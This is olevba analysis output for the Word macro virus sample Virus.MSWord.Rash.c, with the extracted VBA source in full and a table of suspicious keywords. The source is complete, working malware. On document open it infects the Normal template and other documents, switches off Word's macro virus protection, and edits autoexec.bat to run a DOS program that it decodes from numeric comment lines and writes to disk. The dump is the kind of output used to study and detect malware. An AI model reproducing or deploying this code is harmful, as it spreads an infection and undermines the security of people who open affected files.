olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rash.c-586b14166ccdc4c3e44bd9c184246f15b96b8ca8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rash.c-586b14166ccdc4c3e44bd9c184246f15b96b8ca8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Private Sub asder()
Dim marr(999)
lll = 0
nars = "c:\autoexec.bat"
mars = "c:\drvbin.com"
Open nars For Input As #1
Do While Not EOF(1)
    Line Input #1, k
    marr(lll) = k
    lll = lll + 1
Loop
Close #1
If marr(1) = mars Then GoTo endar
Open nars For Output As #1
 Print #1, "echo off"
 Print #1, mars
For j = 0 To (lll - 1)
 Print #1, marr(j)
Next j
Close #1
Open mars For Output Access Write As #1
  col = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   For i = 1 To col
     marr(i) = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   Next i
   For i = 1 To col
    If Left(marr(i), 5) = "Rem #" Then fl = 1
     If Left(marr(i), 5) = "Rem E" Then fl = 0
      If fl = 1 Then
       p = Len(marr(i))
       p = p - 6
       tex = Right(marr(i), p)
       lll = 0
       Dim AD As Variant
       AD = Array(0, 0, 0, 0)
       Dim RAD As Variant
       RAD = Array(100, 10, 1, 0)
        For j = 1 To p
         kj = Mid(tex, j, 1)
         If kj = "#" Then
          j = p
          GoTo sasa
         ElseIf kj = "," Then
          GoTo asas
         Else
           AD(lll) = Asc(kj) - 48
           lll = lll + 1
           GoTo sasa
         End If
asas:   sum = 0
        kum = 2
        For j1 = (lll - 1) To 0 Step -1
         sum = sum + AD(j1) * RAD(kum)
         kum = kum - 1
        Next j1
        Print #1, Chr(sum);
        lll = 0
sasa:   Next j
      End If
   Next i
Close #1
Rem # 14,31,184,3,0,205,16,228,97,138,#
Rem # 224,12,128,230,97,134,224,230,97,184,#
Rem # 0,184,142,192,184,6,0,205,16,185,#
Rem # 0,64,51,255,179,255,232,173,0,50,#
Rem # 219,51,201,186,240,0,131,234,8,232,#
Rem # 109,0,139,193,232,167,0,139,193,184,#
Rem # 1,0,232,190,0,184,200,0,43,193,#
Rem # 232,151,0,131,193,4,131,249,94,118,#
Rem # 221,184,99,0,232,137,0,51,201,51,#
Rem # 219,74,232,66,0,81,209,233,209,233,#
Rem # 209,233,191,144,16,232,104,0,191,144,#
Rem # 48,232,98,0,191,224,16,43,249,232,#
Rem # 90,0,191,224,48,43,249,232,82,0,#
Rem # 89,184,1,0,232,118,0,131,193,9,#
Rem # 129,249,63,1,118,201,232,54,0,180,#
Rem # 0,205,22,60,27,117,116,180,76,205,#
Rem # 33,80,83,82,139,218,184,221,52,186,#
Rem # 18,0,59,211,115,23,247,243,139,216,#
Rem # 228,97,12,3,230,97,176,11,186,67,#
Rem # 0,238,74,138,195,238,138,199,238,90,#
Rem # 91,88,195,80,228,97,36,252,230,97,#
Rem # 88,195,80,81,87,138,195,252,242,170,#
Rem # 95,89,88,195,80,81,82,87,209,232,#
Rem # 185,80,0,246,225,139,248,185,64,1,#
Rem # 232,225,255,129,199,0,32,232,218,255,#
Rem # 95,90,89,88,195,83,30,51,219,142,#
Rem # 219,187,108,4,3,7,59,7,119,252,#
Rem # 31,91,195,14,31,184,3,0,205,16,#
Rem # 186,127,2,180,9,205,33,180,0,205,#
Rem # 22,60,27,117,3,233,115,255,180,15,#
Rem # 205,16,128,252,80,117,62,186,70,0,#
Rem # 232,104,255,228,64,36,63,138,216,185,#
Rem # 3,0,51,246,51,237,180,2,139,213,#
Rem # 128,194,30,138,241,205,16,180,9,46,#
Rem # 138,130,47,4,81,185,1,0,205,16,#
Rem # 89,69,131,253,20,114,225,131,198,20,#
Rem # 65,131,249,22,114,214,232,90,255,180,#
Rem # 0,205,22,60,27,117,3,233,33,255,#
Rem # 233,129,254,201,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,187,13,10,186,32,32,#
Rem # 32,32,32,32,143,144,136,130,133,146,#
Rem # 32,130,135,139,142,140,153,136,138,128,#
Rem # 140,32,151,147,134,136,149,32,130,136,#
Rem # 144,147,145,142,130,33,32,130,235,32,#
Rem # 168,172,165,165,226,165,32,164,165,171,#
Rem # 174,32,225,58,32,32,32,32,186,13,#
Rem # 10,186,32,86,105,114,117,115,32,42,#
Rem # 42,42,32,77,65,82,75,73,90,45,#
Rem # 50,32,42,42,42,32,102,111,114,32,#
Rem # 67,79,77,38,69,88,69,38,79,86,#
Rem # 76,32,102,105,108,101,115,32,115,112,#
Rem # 101,99,105,102,105,99,97,116,105,111,#
Rem # 110,32,186,13,10,186,32,32,32,32,#
Rem # 32,32,40,67,41,32,98,121,32,80,#
Rem # 76,99,97,116,44,32,118,101,114,115,#
Rem # 105,111,110,32,50,46,48,32,47,101,#
Rem # 120,112,101,114,105,109,101,110,116,97,#
Rem # 108,32,118,101,114,115,105,111,110,47,#
Rem # 32,32,32,32,32,32,186,13,10,186,#
Rem # 32,32,67,114,101,97,116,101,100,32,#
Rem # 105,110,32,65,108,109,97,116,121,44,#
Rem # 32,75,97,122,97,107,104,115,116,97,#
Rem # 110,44,32,50,49,46,48,53,46,57,#
Rem # 53,46,32,132,174,32,173,174,162,235,#
Rem # 229,32,162,225,226,224,165,231,33,32,#
Rem # 186,13,10,200,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,188,13,10,32,80,46,#
Rem # 83,46,32,136,167,162,168,173,168,226,#
Rem # 165,44,32,239,44,32,170,160,166,165,#
Rem # 226,225,239,44,32,173,165,231,160,239,#
Rem # 173,173,174,32,175,174,162,168,225,32,#
Rem # 46,46,46,32,36,201,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,187,186,219,219,176,176,#
Rem # 176,176,219,176,176,176,176,219,176,176,#
Rem # 176,219,176,176,186,186,219,176,176,176,#
Rem # 176,219,219,219,176,176,176,176,219,176,#
Rem # 219,176,176,176,186,186,219,176,176,176,#
Rem # 219,219,219,219,219,176,176,219,219,219,#
Rem # 219,219,176,176,186,186,219,176,176,176,#
Rem # 219,219,219,219,219,176,176,219,177,219,#
Rem # 177,219,176,47,186,186,219,176,176,219,#
Rem # 219,219,219,219,219,219,176,219,219,219,#
Rem # 219,219,47,32,186,186,219,176,219,219,#
Rem # 219,219,219,219,219,219,219,219,219,176,#
Rem # 219,219,45,45,186,186,219,176,219,219,#
Rem # 219,219,176,219,219,219,176,176,219,219,#
Rem # 219,176,92,32,186,186,219,219,219,219,#
Rem # 219,219,176,219,219,219,176,176,176,219,#
Rem # 176,176,176,92,186,186,176,219,219,219,#
Rem # 219,219,176,219,219,219,176,176,176,176,#
Rem # 176,176,176,176,186,186,176,176,219,219,#
Rem # 219,219,176,219,219,219,219,176,176,176,#
Rem # 176,176,176,176,186,186,176,219,219,176,#
Rem # 219,219,176,176,219,176,219,176,176,176,#
Rem # 176,176,176,176,186,186,176,219,219,176,#
Rem # 219,219,176,176,219,176,176,219,176,176,#
Rem # 176,176,176,176,186,186,176,219,176,176,#
Rem # 219,176,176,176,176,219,176,219,176,176,#
Rem # 176,176,176,176,186,186,176,219,176,176,#
Rem # 219,176,176,176,176,219,176,219,176,176,#
Rem # 176,176,176,176,186,186,176,219,176,176,#
Rem # 219,176,176,176,176,219,176,176,219,176,#
Rem # 176,176,176,176,186,186,176,176,219,176,#
Rem # 176,219,176,176,176,176,219,176,219,176,#
Rem # 176,176,176,176,186,186,32,77,32,65,#
Rem # 32,82,32,75,32,73,32,90,32,196,#
Rem # 196,32,50,32,186,200,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,188,#
Rem E
endar:
End Sub
Private Sub maina()
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Rem + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
On Error Resume Next
cora = "Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Dim bas(999)
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
bo1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
bo2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
KK = 0
If bo1 <> cora Then
Set bst = NormalTemplate.VBProject.VBComponents.Item(1)
KK = 1
End If
If bo2 <> cora Then
Set bst = ActiveDocument.VBProject.VBComponents.Item(1)
KK = 1
End If
If KK > 0 Then
bol = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  For bi = 1 To bol
   bas(bi) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(bi, 1)
  Next bi
  For bi = 1 To bol
   bst.CodeModule.InsertLines bi, bas(bi)
  Next bi
End If
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
End Sub

Private Sub Document_New()
 maina
End Sub

Private Sub Document_Open()
 asder
 maina
End Sub
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
